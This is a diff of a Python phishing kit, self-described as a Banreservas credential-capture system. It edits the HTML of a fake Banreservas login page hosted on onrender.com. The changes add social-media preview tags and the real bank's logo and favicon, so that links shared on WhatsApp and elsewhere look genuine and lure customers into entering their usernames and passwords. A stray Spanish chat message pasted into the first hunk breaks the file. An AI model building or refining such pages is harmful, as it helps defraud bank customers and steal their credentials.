@@ -1,4 +1,51 @@
-#!/usr/bin/env python3
+amigo te dije que uses SOLAMENTE ESTE CODIGO QUE TE MANDÉ: NO MAS PONME ESTO <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- TÍTULO MÁS LARGO (50-60 caracteres) -->
+    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
+    <link rel="apple-touch-icon" href="https://www.banreservas.com/favicon.ico">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
+    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
+    <meta property="og:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
+    
+    <!-- ⚠️ CAMBIO IMPORTANTE: IMAGEN MÁS GRANDE (1200x630) -->
+    <meta property="og:image" content="https://i.imgur.com/9NhVr5Q.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Banreservas - Acceso Seguro a tu Cuenta">
+    
+    <!-- ✅ NUEVO: og:site_name -->
+    <meta property="og:site_name" content="Banreservas">
+    <meta property="og:locale" content="es_DO">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
+    <meta name="twitter:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
+    <meta name="twitter:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
+    <meta name="twitter:image" content="https://i.imgur.com/9NhVr5Q.png">
+    
+    <!-- WhatsApp specific -->
+    <meta property="og:image:secure_url" content="https://i.imgur.com/9NhVr5Q.png">
+    
+    <!-- General meta -->
+    <meta name="description" content="Acceso seguro a tu cuenta bancaria Banreservas. Ingresa tus credenciales de forma protegida.">
+    <meta name="keywords" content="Banreservas, banco, acceso seguro, login bancario">
+    <meta name="author" content="Banreservas">
+    <meta name="theme-color" content="#004B8D">
+    
+    <!-- Estilos y resto del código -->
+    <style>
+        /* ... tus estilos aquí ... */
+    </style>
+</head> PONME ESO AQUI: SOLAMNETE ESO TE PEDÍ #!/usr/bin/env python3
 """
 Phishing unificado: Banreservas + Sistema de captura de credenciales
 """
@@ -167,49 +214,33 @@ def get_template_banreservas():
     return '''<!DOCTYPE html>
 <html dir="ltr" lang="es-do">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Banco líder del sistema financiero y dinamizador del desarrollo social para los diferentes sectores productivos en beneficio de los dominicanos.">
     
-    <!-- TÍTULO MÁS LARGO (50-60 caracteres) -->
-    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</title>
+    <!-- ========================================== -->
+    <!-- META TAGS PARA VISTA PREVIA EN REDES SOCIALES -->
+    <!-- ========================================== -->
+    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta property="og:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña para realizar tus transacciones de forma segura." />
+    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <meta property="og:url" content="https://banreservas-uyw8.onrender.com/" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta name="twitter:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña." />
+    <meta name="twitter:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <!-- ========================================== -->
     
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
-    <link rel="apple-touch-icon" href="https://www.banreservas.com/favicon.ico">
+    <title>Personal | Banreservas</title>
     
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
-    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
-    <meta property="og:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
+    <!-- Favicon para la pestaña del navegador -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdnebrpeastus.azureedge.net/banreservas/media/q2cdzjtf/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnebrpeastus.azureedge.net/banreservas/media/iclbxops/favicon-16x16.png" />
+    <link rel="apple-touch-icon" href="https://cdnebrpeastus.azureedge.net/banreservas/media/psadezl0/apple-icon-180x180.png" />
     
-    <!-- ⚠️ CAMBIO IMPORTANTE: IMAGEN MÁS GRANDE (1200x630) -->
-    <meta property="og:image" content="https://i.imgur.com/9NhVr5Q.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:image:alt" content="Banreservas - Acceso Seguro a tu Cuenta">
-    
-    <!-- ✅ NUEVO: og:site_name -->
-    <meta property="og:site_name" content="Banreservas">
-    <meta property="og:locale" content="es_DO">
-    
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
-    <meta name="twitter:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
-    <meta name="twitter:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
-    <meta name="twitter:image" content="https://i.imgur.com/9NhVr5Q.png">
-    
-    <!-- WhatsApp specific -->
-    <meta property="og:image:secure_url" content="https://i.imgur.com/9NhVr5Q.png">
-    
-    <!-- General meta -->
-    <meta name="description" content="Acceso seguro a tu cuenta bancaria Banreservas. Ingresa tus credenciales de forma protegida.">
-    <meta name="keywords" content="Banreservas, banco, acceso seguro, login bancario">
-    <meta name="author" content="Banreservas">
-    <meta name="theme-color" content="#004B8D">
-    
-    <!-- Estilos y resto del código -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
         /* Estilos básicos para la página */
         * { margin: 0; padding: 0; box-sizing: border-box; }
